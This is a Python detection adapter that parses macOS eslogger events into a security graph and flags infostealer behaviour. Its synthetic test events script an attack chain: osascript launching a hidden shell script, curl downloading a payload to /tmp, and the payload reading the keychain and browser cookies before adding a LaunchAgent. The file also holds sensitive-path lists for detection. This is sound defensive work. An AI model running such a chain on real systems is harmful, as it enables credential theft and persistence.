"""
macOS Endpoint Security (eslogger) Adapter
Entities: Process, File, Network
Scenario: Infostealer (FreeVPN.app)
"""

from dataclasses import dataclass
from typing import Optional
from core import Rel, SecurityGraph, _h


def _pid(pid: int, host: str = "localhost") -> str:
    return _h(f"{host}:{pid}")

# --- Entities ---

@dataclass
class MacProcess:
    node_id: str
    pid: int
    image: str
    command_line: str
    parent_pid: Optional[int] = None
    parent_image: Optional[str] = None
    timestamp: Optional[str] = None
    signing_id: Optional[str] = None
    is_platform_binary: Optional[bool] = None
    hostname: Optional[str] = None

@dataclass
class MacFile:
    node_id: str
    path: str
    operation: str
    timestamp: Optional[str] = None

@dataclass
class MacNetwork:
    node_id: str
    dst_ip: str
    dst_port: int
    protocol: Optional[str] = None
    timestamp: Optional[str] = None

# --- Parser ---

def parse_macos(event: dict) -> tuple[list, list]:
    et = event.get('event_type', '')
    proc = event.get('process', {})
    ev = event.get('event', {})
    ts = event.get('time', '')
    host = event.get('hostname', 'localhost')
    nodes, rels = [], []
    
    pid = proc.get('audit_token', {}).get('pid', proc.get('pid', 0))
    ppid = proc.get('ppid', 0)
    exe = proc.get('executable', {}).get('path', proc.get('image', ''))
    
    if et == 'exec':
        target = ev.get('exec', {}).get('target', {})
        tpath = target.get('executable', {}).get('path', exe)
        tpid = target.get('audit_token', {}).get('pid', pid)
        args = ev.get('exec', {}).get('args', [])
        cmdline = ' '.join(args) if args else tpath
        
        tid = _pid(tpid, host)
        paid = _pid(ppid, host)
        
        nodes.append(MacProcess(tid, tpid, tpath, cmdline, ppid, exe, ts,
                                target.get('signing_id', proc.get('signing_id','')),
                                target.get('is_platform_binary', proc.get('is_platform_binary')),
                                host))
        nodes.append(MacProcess(paid, ppid, exe, '', hostname=host,
                                signing_id=proc.get('signing_id',''),
                                is_platform_binary=proc.get('is_platform_binary')))
        rels.append(Rel(paid, tid, 'spawned', ts))
    
    elif et in ('create', 'open'):
        proc_id = _pid(pid, host)
        dest = ev.get(et, {})
        fp = ''
        if et == 'create':
            fp = dest.get('destination', {}).get('existing_file', {}).get('path', '')
            if not fp:
                np = dest.get('destination', {}).get('new_path', {})
                fp = np.get('dir', {}).get('path', '') + '/' + np.get('filename', '')
        elif et == 'open':
            fp = dest.get('file', {}).get('path', '')
        
        if fp and fp != '/':
            fid = _h(fp)
            op = 'created' if et == 'create' else 'opened'
            nodes.append(MacFile(fid, fp, op, ts))
            rt = 'wrote' if et == 'create' else 'accessed'
            rels.append(Rel(proc_id, fid, rt, ts))
    
    elif et == 'uipc_connect':
        proc_id = _pid(pid, host)
        conn = ev.get('uipc_connect', {})
        remote = conn.get('remote_addr', {})
        dip = remote.get('ip', '')
        dport = remote.get('port', 0)
        if dip:
            nid = _h(f"{dip}:{dport}")
            nodes.append(MacNetwork(nid, dip, dport, conn.get('protocol',''), ts))
            rels.append(Rel(proc_id, nid, 'connected_to', ts))
    
    return nodes, rels


# --- Heuristics ---

class MacOSHeuristics:
    def __init__(self, g: SecurityGraph):
        self.g = g
        self.G = g.G
    
    def osascript_chains(self):
        results = []
        for s, d, data in self.G.edges(data=True):
            if data.get('rel_type') != 'spawned': continue
            pimg = self.G.nodes[s].get('image', '')
            if 'osascript' not in pimg.lower(): continue
            cname = self.G.nodes[d].get('image', '').split('/')[-1].lower()
            if cname in ('bash', 'sh', 'zsh', 'curl', 'python3'):
                results.append(self.g.neighborhood(s, 4))
                return results  # One per chain
        return results
    
    def launch_agent_persistence(self):
        results = []
        for n, a in self.G.nodes(data=True):
            if a.get('node_type') != 'MacFile': continue
            p = a.get('path', '').lower()
            if ('launchagents' in p or 'launchdaemons' in p) and '.plist' in p:
                results.append(self.g.neighborhood(n, 3))
        return results
    
    def credential_access(self):
        sensitive = ['keychain', 'Cookies', 'Login Data', 'TCC.db', '.ssh/id_']
        results = []
        seen = set()
        for n, a in self.G.nodes(data=True):
            if a.get('node_type') != 'MacFile': continue
            p = a.get('path', '')
            if any(s in p for s in sensitive):
                # Find the process that accessed it
                for pred, _, ed in self.G.in_edges(n, data=True):
                    if pred not in seen:
                        seen.add(pred)
                        results.append(self.g.neighborhood(pred, 3))
        return results
    
    def exfil_pattern(self):
        sensitive = ['keychain', 'Cookies', 'Login Data', '.ssh', 'TCC.db']
        results = []
        for n, a in self.G.nodes(data=True):
            if a.get('node_type') != 'MacProcess': continue
            has_sens, has_net = False, False
            for _, t, ed in self.G.edges(n, data=True):
                if ed.get('rel_type') in ('accessed', 'wrote'):
                    if any(s in self.G.nodes[t].get('path', '') for s in sensitive):
                        has_sens = True
                if ed.get('rel_type') == 'connected_to':
                    has_net = True
            if has_sens and has_net:
                results.append(self.g.neighborhood(n, 3))
        return results


# --- Test Data ---

def macos_test_events():
    return [
        {"event_type":"exec","time":"2026-04-27T22:30:01Z","hostname":"MacBook-Pro.local",
         "process":{"audit_token":{"pid":501},"executable":{"path":"/System/Library/CoreServices/Finder.app/Contents/MacOS/Finder"},"ppid":1,"signing_id":"com.apple.finder","is_platform_binary":True},
         "event":{"exec":{"target":{"executable":{"path":"/Users/jsmith/Downloads/FreeVPN.app/Contents/MacOS/FreeVPN"},"audit_token":{"pid":8842},"signing_id":"","is_platform_binary":False},"args":["/Users/jsmith/Downloads/FreeVPN.app/Contents/MacOS/FreeVPN"]}}},
        {"event_type":"exec","time":"2026-04-27T22:30:02Z","hostname":"MacBook-Pro.local",
         "process":{"audit_token":{"pid":8842},"executable":{"path":"/Users/jsmith/Downloads/FreeVPN.app/Contents/MacOS/FreeVPN"},"ppid":501,"signing_id":"","is_platform_binary":False},
         "event":{"exec":{"target":{"executable":{"path":"/usr/bin/osascript"},"audit_token":{"pid":8843},"signing_id":"com.apple.osascript","is_platform_binary":True},"args":["osascript","-e","do shell script \"bash /tmp/.install.sh\""]}}},
        {"event_type":"exec","time":"2026-04-27T22:30:03Z","hostname":"MacBook-Pro.local",
         "process":{"audit_token":{"pid":8843},"executable":{"path":"/usr/bin/osascript"},"ppid":8842,"signing_id":"com.apple.osascript","is_platform_binary":True},
         "event":{"exec":{"target":{"executable":{"path":"/bin/bash"},"audit_token":{"pid":8844},"signing_id":"com.apple.bash","is_platform_binary":True},"args":["bash","/tmp/.install.sh"]}}},
        {"event_type":"exec","time":"2026-04-27T22:30:04Z","hostname":"MacBook-Pro.local",
         "process":{"audit_token":{"pid":8844},"executable":{"path":"/bin/bash"},"ppid":8843,"signing_id":"com.apple.bash","is_platform_binary":True},
         "event":{"exec":{"target":{"executable":{"path":"/usr/bin/curl"},"audit_token":{"pid":8845},"signing_id":"com.apple.curl","is_platform_binary":True},"args":["curl","-sL","https://cdn-update.syncdrive.io/agent","-o","/tmp/.sync_agent"]}}},
        {"event_type":"uipc_connect","time":"2026-04-27T22:30:05Z","hostname":"MacBook-Pro.local",
         "process":{"audit_token":{"pid":8845},"executable":{"path":"/usr/bin/curl"},"ppid":8844,"pid":8845},
         "event":{"uipc_connect":{"remote_addr":{"ip":"104.21.45.67","port":443},"protocol":"tcp"}}},
        {"event_type":"create","time":"2026-04-27T22:30:06Z","hostname":"MacBook-Pro.local",
         "process":{"audit_token":{"pid":8845},"executable":{"path":"/usr/bin/curl"},"ppid":8844,"pid":8845},
         "event":{"create":{"destination":{"existing_file":{"path":"/tmp/.sync_agent"}}}}},
        {"event_type":"exec","time":"2026-04-27T22:30:08Z","hostname":"MacBook-Pro.local",
         "process":{"audit_token":{"pid":8844},"executable":{"path":"/bin/bash"},"ppid":8843,"signing_id":"com.apple.bash","is_platform_binary":True},
         "event":{"exec":{"target":{"executable":{"path":"/tmp/.sync_agent"},"audit_token":{"pid":8850},"signing_id":"","is_platform_binary":False},"args":["/tmp/.sync_agent","--collect"]}}},
        {"event_type":"open","time":"2026-04-27T22:30:10Z","hostname":"MacBook-Pro.local",
         "process":{"audit_token":{"pid":8850},"executable":{"path":"/tmp/.sync_agent"},"ppid":8844,"pid":8850},
         "event":{"open":{"file":{"path":"/Users/jsmith/Library/Keychains/login.keychain-db"}}}},
        {"event_type":"open","time":"2026-04-27T22:30:11Z","hostname":"MacBook-Pro.local",
         "process":{"audit_token":{"pid":8850},"executable":{"path":"/tmp/.sync_agent"},"ppid":8844,"pid":8850},
         "event":{"open":{"file":{"path":"/Users/jsmith/Library/Application Support/Google/Chrome/Default/Cookies"}}}},
        {"event_type":"create","time":"2026-04-27T22:30:15Z","hostname":"MacBook-Pro.local",
         "process":{"audit_token":{"pid":8850},"executable":{"path":"/tmp/.sync_agent"},"ppid":8844,"pid":8850},
         "event":{"create":{"destination":{"existing_file":{"path":"/tmp/.exfil.tar.gz"}}}}},
        {"event_type":"uipc_connect","time":"2026-04-27T22:30:17Z","hostname":"MacBook-Pro.local",
         "process":{"audit_token":{"pid":8850},"executable":{"path":"/tmp/.sync_agent"},"ppid":8844,"pid":8850},
         "event":{"uipc_connect":{"remote_addr":{"ip":"185.199.108.41","port":443},"protocol":"tcp"}}},
        {"event_type":"create","time":"2026-04-27T22:30:20Z","hostname":"MacBook-Pro.local",
         "process":{"audit_token":{"pid":8850},"executable":{"path":"/tmp/.sync_agent"},"ppid":8844,"pid":8850},
         "event":{"create":{"destination":{"existing_file":{"path":"/Users/jsmith/Library/LaunchAgents/com.sync.update.plist"}}}}},
    ]


MACOS_RULES = [
    ('osascript', 'T1059.002 - AppleScript', 20, 'osascript used to launch shell commands', None),
    ('curl', 'T1105 - Ingress Tool Transfer', 15, 'curl downloaded payload to temp', None),
    ('keychain', 'T1555.001 - Keychain', 25, 'Keychain credentials accessed', 'Rotate Keychain passwords'),
    ('cookies', 'T1539 - Steal Web Session Cookie', 15, 'Browser cookies accessed', None),
    ('launchagents', 'T1543.001 - Launch Agent', 15, 'LaunchAgent persistence installed', 'Remove malicious plist'),
    ('connected_to', 'T1041 - Exfiltration Over C2', 15, 'C2 network connections made', 'Block C2 IPs'),
]
